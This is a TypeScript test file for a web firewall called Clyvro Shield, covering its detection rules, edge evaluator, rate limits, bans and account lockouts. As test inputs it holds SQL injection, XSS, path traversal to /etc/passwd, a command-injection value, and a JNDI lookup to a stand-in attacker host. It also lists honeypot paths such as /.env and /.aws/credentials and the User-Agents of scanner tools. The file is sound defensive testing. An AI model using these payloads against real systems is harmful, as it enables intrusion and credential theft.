/**
 * Clyvro Shield tests — rules (true and false positives against real
 * Clyvro URLs), the edge evaluator with an injected status snapshot, and
 * the Node service (settings, escalation ladder, lockouts, pruning)
 * against embedded PGlite.
 */
import { beforeAll, describe, expect, it } from "vitest";

process.env.CLYVRO_DB_MEMORY = "1";
process.env.AUTH_SECRET = process.env.AUTH_SECRET ?? "shield-test-secret";

import {
  BLOCK_SCORE, decide, hashIp, inspectRequest, limitFor, maskIp, requestIp, routeClass, shieldExempt,
} from "@/lib/shield/rules";
import { evaluateRequest, parseStatus, resetShieldEdgeState, type ShieldStatus } from "@/lib/shield/edge";

const inspect = (pathname: string, search = "", ua: string | null = "Mozilla/5.0 (Windows NT 10.0) Chrome/130") =>
  inspectRequest({ method: "GET", pathname, search, userAgent: ua });

describe("Shield rules — legitimate Clyvro traffic is never blocked", () => {
  const legit: [string, string][] = [
    ["/", ""],
    ["/pricing", ""],
    ["/scan", "?url=https%3A%2F%2Fexample.com%2Fblog%3Fid%3D1%26sort%3Ddesc"],
    ["/scan", "?url=https://shop.example/search?q=select+from+catalogue"],
    ["/app/audits/aud_1234567890", ""],
    ["/api/audits/aud_1234567890", ""],
    ["/api/auth/callback/credentials", ""],
    ["/sign-in", "?callbackUrl=%2Fapp%2Fsettings"],
    ["/api/auth/signin", "?callbackUrl=https%3A%2F%2Fclyvro.vercel.app%2Fapp"],
    ["/shared/r/abcdef123456", ""],
    ["/app/settings", ""],
    ["/api/account/preferences", ""],
    ["/changelog", "?tag=improvement"],
    ["/app/clients", "?page=2&sort=name"],
    ["/api/cron/tick", ""],
    ["/sitemap.xml", ""],
    ["/robots.txt", ""],
    ["/app/projects/prj_1/schedules", "?q=weekly%20report"],
    ["/invite/tok_8f7e6d5c4b3a2910", ""],
    ["/app/audits", "?status=completed&from=2026-01-01&to=2026-12-31"],
  ];
  for (const [path, search] of legit) {
    it(`${path}${search} is allowed`, () => {
      const r = inspect(path, search);
      expect(r.verdict, JSON.stringify(r.matches)).not.toBe("block");
      expect(decide(r, "enforce")).not.toBe("block");
    });
  }

  it("lenient keys (url, callbackUrl, q) can only ever be suspicious", () => {
    const r = inspect("/scan", "?url=https://victim.example/?id=1%27%20UNION%20SELECT%20password%20FROM%20users--");
    expect(r.verdict).toBe("suspicious");
    expect(decide(r, "under-attack")).toBe("log");
  });

  it("well-known paths are exempt from inspection entirely", () => {
    expect(shieldExempt("/.well-known/security.txt")).toBe(true);
    expect(shieldExempt("/api/shield/status")).toBe(true);
    expect(shieldExempt("/_next/static/chunk.js")).toBe(true);
    expect(shieldExempt("/api/audits")).toBe(false);
  });
});

describe("Shield rules — attacks are caught", () => {
  it("honeypot paths block in every mode and escalate", () => {
    for (const p of ["/.env", "/api/.env.local", "/.git/config", "/wp-login.php", "/phpmyadmin/", "/cgi-bin/test.cgi", "/backup.zip", "/index.php", "/actuator/health", "/.aws/credentials"]) {
      const r = inspect(p);
      expect(r.verdict, p).toBe("block");
      expect(r.alwaysEnforced, p).toBe(true);
      expect(r.primary, p).toBe("honeypot");
      expect(decide(r, "monitor"), p).toBe("block");
    }
  });

  it("offensive-tool User-Agents block in every mode; ordinary clients do not", () => {
    for (const ua of ["sqlmap/1.7.2#stable (https://sqlmap.org)", "Mozilla/5.0 (compatible; Nikto/2.1.6)", "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)", "masscan/1.3", "WPScan v3.8"]) {
      const r = inspect("/", "", ua);
      expect(r.verdict, ua).toBe("block");
      expect(r.primary, ua).toBe("scanner-ua");
    }
    for (const ua of ["curl/8.4.0", "python-requests/2.31", "Go-http-client/1.1", "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)", "ClyvroCron/1.0", null]) {
      expect(inspect("/", "", ua).verdict, String(ua)).toBe("allow");
    }
  });

  it("null bytes always block", () => {
    const r = inspect("/app/%00", "");
    expect(r.verdict).toBe("block");
    expect(r.alwaysEnforced).toBe(true);
  });

  it("strong injection signatures block only in enforce modes", () => {
    const cases: [string, string, string][] = [
      ["sqli", "/api/audits", "?id=1%27%20UNION%20SELECT%20null,version()--"],
      ["sqli", "/pricing", "?plan=1%20AND%20sleep(5)"],
      ["sqli", "/api/projects", "?name=x%27%20or%20%271%27%3D%271"],
      ["xss", "/pricing", "?ref=%3Cscript%3Ealert(1)%3C/script%3E"],
      ["xss", "/app", "?x=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"],
      ["traversal", "/app/..%2F..%2F..%2Fetc%2Fpasswd", ""],
      ["lfi", "/api/files", "?path=php://filter/convert.base64-encode/resource=index"],
      ["cmdi", "/api/ping", "?host=127.0.0.1;cat%20/etc/passwd"],
      ["ssti", "/pricing", "?name=%7B%7B7*7%7D%7D"],
      ["jndi", "/", "?x=%24%7Bjndi:ldap://evil.example/a%7D"],
    ];
    for (const [family, path, search] of cases) {
      const r = inspect(path, search);
      expect(r.verdict, `${family} ${path}${search}`).toBe("block");
      expect(r.score).toBeGreaterThanOrEqual(BLOCK_SCORE);
      expect(r.matches.some((m) => m.family === family), `${family} ${JSON.stringify(r.matches)}`).toBe(true);
      expect(r.alwaysEnforced).toBe(false);
      expect(decide(r, "monitor")).toBe("log");
      expect(decide(r, "enforce")).toBe("block");
      expect(decide(r, "under-attack")).toBe("block");
    }
  });

  it("weak hints are only suspicious", () => {
    const r = inspect("/app/clients", "?note=call%20alert(%20the%20team%20)");
    expect(r.verdict).toBe("suspicious");
    expect(decide(r, "enforce")).toBe("log");
  });

  it("double-encoded traversal is still decoded", () => {
    expect(inspect("/app/%252e%252e/%252e%252e/%252e%252e/etc/passwd").verdict).toBe("block");
  });
});

describe("Shield rate classes and helpers", () => {
  it("classifies routes", () => {
    expect(routeClass("POST", "/api/auth/callback/credentials")).toBe("auth");
    expect(routeClass("POST", "/api/auth/register")).toBe("auth");
    expect(routeClass("GET", "/api/auth/session")).toBe("api");
    expect(routeClass("POST", "/api/scan")).toBe("public-write");
    expect(routeClass("POST", "/api/waitlist")).toBe("public-write");
    expect(routeClass("GET", "/api/audits")).toBe("api");
    expect(routeClass("GET", "/pricing")).toBe("page");
  });

  it("under attack divides limits by four", () => {
    expect(limitFor("api", "monitor").limit).toBe(400);
    expect(limitFor("api", "under-attack").limit).toBe(100);
    expect(limitFor("auth", "enforce")).toEqual({ limit: 30, windowMs: 600_000 });
  });

  it("masks and hashes addresses", async () => {
    expect(maskIp("102.89.34.7")).toBe("102.89.x.x");
    expect(maskIp("2a02:1234:5678:9abc::1")).toBe("2a02:1234:5678::…");
    expect(maskIp("unknown")).toBe("unknown");
    const a = await hashIp("102.89.34.7", "s1");
    expect(a).toMatch(/^[a-f0-9]{64}$/);
    expect(await hashIp("102.89.34.7", "s1")).toBe(a);
    expect(await hashIp("102.89.34.7", "s2")).not.toBe(a);
    expect(requestIp(new Headers({ "x-forwarded-for": "203.0.113.9, 10.0.0.1" }))).toBe("203.0.113.9");
    expect(requestIp(new Headers())).toBe("unknown");
  });

  it("parses status snapshots defensively", () => {
    const s = parseStatus({ mode: "enforce", allowed: ["a", 1], banned: null }, 5);
    expect(s.mode).toBe("enforce");
    expect([...s.allowed]).toEqual(["a"]);
    expect(s.banned.size).toBe(0);
    expect(parseStatus({ mode: "bogus" }, 1).mode).toBe("monitor");
  });
});

describe("Shield edge evaluator", () => {
  const secret = "edge-secret";
  const status = (over: Partial<ShieldStatus> = {}): ShieldStatus => ({ mode: "monitor", allowed: new Set(), banned: new Set(), at: 1, ...over });
  const req = (pathname: string, ip: string, extra: Record<string, string> = {}, method = "GET") => ({
    method,
    headers: new Headers({ "x-forwarded-for": ip, "user-agent": "Mozilla/5.0", ...extra }),
    nextUrl: { pathname, search: "", origin: "https://clyvro.test" },
  });

  it("allows normal requests and skips exempt paths", async () => {
    resetShieldEdgeState();
    expect(await evaluateRequest(req("/api/shield/status", "1.1.1.1"), secret, status())).toBeNull();
    const d = await evaluateRequest(req("/pricing", "1.1.1.1"), secret, status());
    expect(d?.action).toBe("allow");
    expect(d?.ipMasked).toBe("1.1.x.x");
  });

  it("bans and allowlists are keyed by hash", async () => {
    resetShieldEdgeState();
    const h = await hashIp("9.9.9.9", secret);
    const banned = await evaluateRequest(req("/pricing", "9.9.9.9"), secret, status({ banned: new Set([h]) }));
    expect(banned?.action).toBe("block");
    expect(banned?.reason).toBe("banned");
    const allowed = await evaluateRequest(req("/.env", "9.9.9.9"), secret, status({ allowed: new Set([h]), banned: new Set([h]) }));
    expect(allowed?.action).toBe("allow");
  });

  it("honeypots block in monitor mode while signatures are only logged", async () => {
    resetShieldEdgeState();
    const trap = await evaluateRequest(req("/wp-login.php", "2.2.2.2"), secret, status());
    expect(trap?.action).toBe("block");
    expect(trap?.reason).toBe("honeypot");
    const sig = await evaluateRequest({ ...req("/pricing", "2.2.2.2"), nextUrl: { pathname: "/pricing", search: "?x=%3Cscript%3Ealert(1)%3C/script%3E", origin: "https://clyvro.test" } }, secret, status());
    expect(sig?.action).toBe("log");
    expect(sig?.wouldBlock).toBe(true);
    const enforced = await evaluateRequest({ ...req("/pricing", "2.2.2.2"), nextUrl: { pathname: "/pricing", search: "?x=%3Cscript%3Ealert(1)%3C/script%3E", origin: "https://clyvro.test" } }, secret, status({ mode: "enforce" }));
    expect(enforced?.action).toBe("block");
    expect(enforced?.reason).toBe("xss");
  });

  it("rate-limits the auth class per address", async () => {
    resetShieldEdgeState();
    let last = null as Awaited<ReturnType<typeof evaluateRequest>>;
    for (let i = 0; i < 31; i += 1) {
      last = await evaluateRequest(req("/api/auth/callback/credentials", "3.3.3.3", {}, "POST"), secret, status());
    }
    expect(last?.action).toBe("block");
    expect(last?.reason).toBe("rate-limit");
    expect(last?.retryAfterSeconds).toBe(600);
    // A different address is unaffected.
    expect((await evaluateRequest(req("/api/auth/callback/credentials", "4.4.4.4", {}, "POST"), secret, status()))?.action).toBe("allow");
  });
});

describe("Shield service (PGlite)", () => {
  type DB = import("@/lib/db").DB;
  let db: DB;
  let shield: typeof import("@/lib/services/shield");
  const actor = { userId: "u_admin", email: "admin@clyvro.test" };

  beforeAll(async () => {
    db = await (await import("@/lib/db")).createDb();
    shield = await import("@/lib/services/shield");
  }, 60_000);

  it("defaults to monitor and persists mode + allowlist", async () => {
    expect((await shield.getShieldSettings(db, true)).mode).toBe("monitor");
    await shield.setShieldMode(actor, "enforce", db);
    expect((await shield.getShieldSettings(db, true)).mode).toBe("enforce");
    await expect(shield.setShieldMode(actor, "nope" as never, db)).rejects.toThrow();
    const after = await shield.allowIp(actor, "102.89.34.7", "Founder", db);
    expect(after.allow).toHaveLength(1);
    expect(after.allow[0]!.label).toBe("102.89.x.x");
    expect(after.allow[0]!.hash).toBe(await shield.ipKey("102.89.34.7"));
    const removed = await shield.unallowIp(actor, after.allow[0]!.hash, db);
    expect(removed.allow).toHaveLength(0);
    expect(shield.parseShieldSettings({ mode: "under-attack", allow: [{ hash: "h", label: "x" }, "junk"] })).toEqual({
      mode: "under-attack", allow: [{ hash: "h", label: "x", note: "", addedAt: new Date(0).toISOString() }],
    });
  });

  it("climbs the escalation ladder and exposes active bans to the edge", async () => {
    const ipHash = await shield.ipKey("198.51.100.5");
    // Three blocks: below the first rung.
    for (let i = 0; i < 3; i += 1) {
      await shield.recordEvent({ ipHash, ipMasked: "198.51.x.x", method: "GET", path: "/x", verdict: "blocked", rule: "sqli", mode: "enforce" }, db);
    }
    expect(await shield.escalate(ipHash, "198.51.x.x", "sqli", db)).toBeNull();
    await shield.recordEvent({ ipHash, ipMasked: "198.51.x.x", method: "GET", path: "/x", verdict: "blocked", rule: "sqli", mode: "enforce" }, db);
    const first = await shield.escalate(ipHash, "198.51.x.x", "sqli", db);
    expect(first?.level).toBe(1);
    expect((await shield.activeBanKeys(db)).ips).toContain(ipHash);
    // A honeypot hit jumps straight to level 3 (24 h) even with little history.
    const trapHash = await shield.ipKey("198.51.100.6");
    await shield.recordEvent({ ipHash: trapHash, ipMasked: "198.51.x.x", method: "GET", path: "/.env", verdict: "blocked", rule: "honeypot", mode: "monitor" }, db);
    const trap = await shield.escalate(trapHash, "198.51.x.x", "honeypot", db);
    expect(trap?.level).toBe(3);
    expect(trap!.expiresAt.getTime() - Date.now()).toBeGreaterThan(23 * 60 * 60_000);
    expect(shield.ladderLevel(0, "scanner-ua")).toBe(2);
    expect(shield.ladderLevel(60, "sqli")).toBe(4);
  });

  it("manual bans, unbans and the overview", async () => {
    const ban = await shield.banIp(actor, { ip: "203.0.113.77" }, 120, "testing", db);
    expect(ban.level).toBe(2);
    expect(ban.label).toBe("203.0.x.x");
    const overview = await shield.getShieldOverview(db);
    expect(overview.bans.some((b) => b.key === ban.key && b.createdBy === actor.email)).toBe(true);
    expect(overview.stats.activeBans).toBeGreaterThanOrEqual(1);
    expect(overview.catalogue.length).toBeGreaterThan(5);
    expect(overview.ladder[0]!.blocks).toBe(4);
    await shield.unban(actor, ban.key, db);
    expect((await shield.activeBanKeys(db)).ips).not.toContain(ban.key.slice(3));
    await expect(shield.banIp(actor, { hash: "not-a-hash" }, 10, "x", db)).rejects.toThrow(/valid IP/);
  });

  it("locks an account after repeated failed sign-ins without leaking anything", async () => {
    const email = "victim@example.com";
    expect(await shield.isLoginLocked(email, db)).toBe(false);
    for (let i = 0; i < 4; i += 1) {
      expect((await shield.recordLoginFailure(email, "198.51.100.9", db)).locked).toBe(false);
    }
    expect(await shield.isLoginLocked(email, db)).toBe(false);
    expect((await shield.recordLoginFailure(email, "198.51.100.9", db)).locked).toBe(true);
    expect(await shield.isLoginLocked(email, db)).toBe(true);
    expect(await shield.isLoginLocked("other@example.com", db)).toBe(false);
    const overview = await shield.getShieldOverview(db);
    const lock = overview.bans.find((b) => b.kind === "account");
    expect(lock?.label).toBe("vi***@example.com");
    expect(overview.stats.loginFailed24h).toBeGreaterThanOrEqual(5);
    await shield.unban(actor, lock!.key, db);
    expect(await shield.isLoginLocked(email, db)).toBe(false);
  });

  it("prunes old events and expired bans", async () => {
    const { securityEvents, securityBans } = await import("@/lib/db/schema");
    const { newId } = await import("@/lib/db");
    const old = new Date(Date.now() - 10 * 24 * 60 * 60_000);
    await db.insert(securityEvents).values({ id: newId(), ipHash: "h", ipMasked: "x", method: "GET", path: "/", verdict: "blocked", rule: "sqli", mode: "monitor", createdAt: old });
    await db.insert(securityBans).values({ key: "ip:old", kind: "ip", label: "x", reason: "r", level: 1, hits: 1, expiresAt: new Date(Date.now() - 2 * 24 * 60 * 60_000) });
    await shield.pruneShield(db);
    const { eq } = await import("drizzle-orm");
    expect(await db.select().from(securityEvents).where(eq(securityEvents.ipHash, "h"))).toHaveLength(0);
    expect(await db.select().from(securityBans).where(eq(securityBans.key, "ip:old"))).toHaveLength(0);
  });
});

describe("Shield never blocks a route that exists in src/app", () => {
  it("every page and API route passes in enforce mode", async () => {
    const fs = await import("node:fs");
    const path = await import("node:path");
    const root = path.join(process.cwd(), "src", "app");
    const routes: string[] = [];
    const walk = (dir: string) => {
      for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
        const full = path.join(dir, entry.name);
        if (entry.isDirectory()) walk(full);
        else if (entry.name === "page.tsx" || entry.name === "route.ts") {
          const rel = path.relative(root, path.dirname(full)).split(path.sep)
            .filter((seg) => seg && !/^\(.*\)$/.test(seg))
            .map((seg) => seg.replace(/^\[\.\.\..*\]$/, "callback/credentials").replace(/^\[.*\]$/, "abc123DEF"))
            .join("/");
          routes.push(`/${rel}`);
        }
      }
    };
    walk(root);
    expect(routes.length).toBeGreaterThan(40);
    const blocked = routes.filter((r) => !shieldExempt(r) && decide(inspectRequest({ method: "POST", pathname: r, search: "", userAgent: "Mozilla/5.0" }), "enforce") === "block");
    expect(blocked, blocked.join(", ")).toEqual([]);
  });
});

describe("Shield flood ladder", () => {
  it("rate-limit samples escalate gently and separately from signature blocks", async () => {
    const shield = await import("@/lib/services/shield");
    const db = await (await import("@/lib/db")).createDb();
    expect(shield.floodLevel(9)).toBe(0);
    expect(shield.floodLevel(10)).toBe(1);
    expect(shield.floodLevel(40)).toBe(2);
    const ipHash = await shield.ipKey("198.51.100.77");
    for (let i = 0; i < 10; i += 1) {
      await shield.recordEvent({ ipHash, ipMasked: "198.51.x.x", method: "GET", path: "/api/audits", verdict: "rate-limited", rule: "rate-limit", mode: "monitor" }, db);
    }
    const ban = await shield.escalate(ipHash, "198.51.x.x", "rate-limit", db);
    expect(ban?.level).toBe(1);
    // 25 rate-limited samples must not reach the 24 h rung reserved for attack signatures.
    for (let i = 0; i < 15; i += 1) {
      await shield.recordEvent({ ipHash, ipMasked: "198.51.x.x", method: "GET", path: "/api/audits", verdict: "rate-limited", rule: "rate-limit", mode: "monitor" }, db);
    }
    expect((await shield.escalate(ipHash, "198.51.x.x", "rate-limit", db))?.level).toBe(1);
  });
});
